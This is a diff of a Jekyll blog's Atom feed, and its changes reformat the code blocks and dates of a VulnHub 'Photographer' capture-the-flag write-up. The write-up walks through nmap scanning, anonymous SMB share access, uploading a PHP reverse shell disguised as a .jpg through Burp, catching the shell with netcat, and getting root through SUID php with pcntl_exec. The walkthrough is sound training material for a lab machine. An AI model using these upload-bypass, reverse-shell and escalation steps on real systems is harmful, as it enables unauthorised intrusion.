@@ -4,7 +4,7 @@
   <generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator>
   <link href="/tag/vulnhub/feed.xml" rel="self" type="application/atom+xml" />
   <link href="/" rel="alternate" type="text/html" />
-  <updated>2020-09-05T00:12:40+00:00</updated>
+  <updated>2020-09-05T11:57:12+00:00</updated>
   <id>/tag/vulnhub/feed.xml</id>
 
   
@@ -34,8 +34,8 @@
     <entry>
       <title type="html">Photographer Write Up</title>
       <link href="/photographer" rel="alternate" type="text/html" title="Photographer Write Up" />
-      <published>2020-09-04T00:00:00+00:00</published>
-      <updated>2020-09-04T00:00:00+00:00</updated>
+      <published>2020-09-05T00:00:00+00:00</published>
+      <updated>2020-09-05T00:00:00+00:00</updated>
       <id>/photographer</id>
       <content type="html" xml:base="/photographer">&lt;p&gt;&lt;img src=&quot;/assets/images/photographer.png&quot; alt=&quot;Photographer&quot; /&gt;&lt;/p&gt;
 
@@ -47,7 +47,7 @@
 
 &lt;p&gt;Starting with a Nmap scan lets see what ports are open. I got the IP of the machine by checking the DHCP server on my network. However, I could have used arp-scan to find the IP address.&lt;/p&gt;
 
-&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $nmap -sC -sV -oA nmap/initial 192.168.1.77
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-01 17:54 BST
 Nmap scan report for 192.168.1.77
@@ -91,7 +91,7 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;The scan reveals 4 ports open, Samba and two web. Based on the HTTP banners it looks to be a Linux Ubuntu machine, Googling apache 2.4.18 ubuntu reveals the OS is probably Ubuntu Xenial 16.04 LTS.&lt;/p&gt;
 
@@ -110,9 +110,8 @@ Nmap done: 1 IP address (1 host up) scanned in 12.80 seconds
 &lt;p&gt;&lt;img src=&quot;/assets/images/photographer/login.png&quot; alt=&quot;Login&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Using smbclient and logging in anonymously shows one share in particular that looks interesting ‘sambashare’.&lt;/p&gt;
-&lt;pre&gt;
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $smbclient -L \\\\192.168.1.77\\
 
         Sharename       Type      Comment
@@ -138,12 +137,11 @@ getting file \mailsent.txt of size 503 as mailsent.txt (245.6 KiloBytes/sec) (av
 Get file wordpress.bkp.zip? y
 getting file \wordpress.bkp.zip of size 13930308 as wordpress.bkp.zip (67013.8 KiloBytes/sec) (average 66362.5 KiloBytes/sec)
 smb: \&amp;gt; 
-```
-&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;Two files are on the share, the first is an email from Agi to Daisa advising the site is ready and the other file appears to be a backup zip of the site.&lt;/p&gt;
-&lt;pre&gt;
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cat mailsent.txt 
 Message-ID: &amp;lt;4129F3CA.2020509@dc.edu&amp;gt;
 Date: Mon, 20 Jul 2020 11:40:36 -0400
@@ -161,8 +159,8 @@ Your site is ready now.
 Don\'t forget your secret, my babygirl ;)
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $
-```
-&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;‘babygirl’ looks to be a hint to the password and I now have 2 users and email addresses:&lt;/p&gt;
 
 &lt;ul&gt;
@@ -178,29 +176,24 @@ Don\'t forget your secret, my babygirl ;)
 
 &lt;p&gt;Going back to the exploit from earlier, it looks like I can upload a PHP file by saving the file as .jpg then use Burp to rename it. Im going to try and upload a reverse shell PHP script. If your using Kali or ParrotOS the script can be found in /usr/share/webshells/php/ or downloaded from &lt;a href=&quot;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&quot;&gt;pentestmonkey&lt;/a&gt;.&lt;/p&gt;
 
-&lt;pre&gt;
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $cp /usr/share/webshells/php/php-reverse-shell.php .
 ┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $mv php-reverse-shell.php shell.php.jpg
-```
-&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;I update the script with my local IP and port details.&lt;/p&gt;
-&lt;pre&gt;
-```
-$ip = '127.0.0.1';  // CHANGE THIS
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;$ip = '127.0.0.1';  // CHANGE THIS
 $port = 1234;       // CHANGE THIS
-```
-&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;
+
 &lt;p&gt;Start a netcat listener ready to catch the shell.&lt;/p&gt;
-&lt;pre&gt;
-```
-┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;┌─[daz@parrot]─[~/Documents/Vulnhub/Photographer]
 └──╼ $sudo nc -nvlp 443
 listening on [any] 443 ...
-```
-&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;Going back to the admin page I upload the file using ‘Import content’ and find the PHP file. With Burp open and proxy intercept on I set Burp as a proxy in my browser and select ‘Import’.&lt;/p&gt;
 
@@ -219,17 +212,15 @@ listening on [any] 443 ...
 &lt;p&gt;&lt;img src=&quot;/assets/images/photographer/shell.png&quot; alt=&quot;Shell&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;The first flag can be found in Daisa’s user directory.&lt;/p&gt;
-&lt;pre&gt;
-```
-www-data@photographer:/$ cd home/daisa/
+
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/$ cd home/daisa/
 www-data@photographer:/home/daisa$ ls
 Desktop    Downloads  Pictures  Templates  examples.desktop
 Documents  Music      Public    Videos     user.txt
 www-data@photographer:/home/daisa$ cat user.txt 
 d41d8cd98f00{REDACTED}
 www-data@photographer:/home/daisa$
-```
-&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;h3 id=&quot;privilege-escalation&quot;&gt;Privilege Escalation&lt;/h3&gt;
 
@@ -250,24 +241,19 @@ www-data@photographer:/home/daisa$
 &lt;p&gt;&lt;img src=&quot;/assets/images/photographer/phpsuid.png&quot; alt=&quot;gtfobins&quot; /&gt;&lt;/p&gt;
 
 &lt;p&gt;Lets give it a go.&lt;/p&gt;
-&lt;pre&gt;
 
-```
-www-data@photographer:/tmp$ CMD=&quot;/bin/sh&quot;
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;www-data@photographer:/tmp$ CMD=&quot;/bin/sh&quot;
 www-data@photographer:/tmp$ /usr/bin/php7.2 -r &quot;pcntl_exec('/bin/sh', ['-p']);&quot;
 # id
 uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
 # whoami
 root
 #
-```
-&lt;/pre&gt;
+&lt;/code&gt;&lt;/pre&gt;
 
 &lt;p&gt;We have root! Lets grab the flag.&lt;/p&gt;
 
-&lt;pre&gt;
-```
-# 
+&lt;pre&gt;&lt;code class=&quot;language-highlight&quot;&gt;# 
 # cd /root
 # cat proof.txt
                                                                 
@@ -301,8 +287,7 @@ Follow me at: http://v1n1v131r4.com
 
 d41d8cd98f00{REDACTED}
 #
-```
-&lt;/pre&gt;</content>
+&lt;/code&gt;&lt;/pre&gt;</content>
 
       
       
